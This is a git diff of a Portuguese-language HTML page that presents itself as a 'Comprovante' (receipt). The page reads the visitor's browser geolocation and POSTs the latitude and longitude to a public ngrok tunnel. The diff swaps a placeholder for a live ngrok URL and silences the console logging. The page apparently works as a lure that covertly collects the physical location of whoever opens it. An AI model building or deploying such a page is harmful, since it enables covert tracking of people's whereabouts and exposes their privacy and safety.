@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8">
   <title>Comprovante</title>
 </head>
+
 <body style="background-color: antiquewhite;">
   <h1>Comprovante</h1>
 
@@ -21,28 +23,29 @@
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      console.log("Latitude: " + latitude);
-      console.log("Longitude: " + longitude);
+      // console.log("Latitude: " + latitude);
+      // console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("NGROK-SERVER/send-location", {
+      fetch("https://48b8-2804-7f0-bb41-46f3-9853-615a-e14b-3c18.ngrok-free.app/receber-localizacao", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({ latitude, longitude })
       })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          alert("Algo deu errado. Tente novamente mais tarde.");
-        } else {
-          alert("Algo deu errado. Tente novamente mais tarde.");
-        }
-      })
-      .catch(error => {
-        console.error("Erro:", error);
-      });
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            alert("Localização enviada com sucesso!");
+          } else {
+            alert("Algo deu errado. Tente novamente mais tarde.");
+          }
+        })
+
+        .catch(error => {
+          console.error("Erro:", error);
+        });
     }
 
     function handleError(error) {
@@ -50,4 +53,5 @@
     }
   </script>
 </body>
+
 </html>
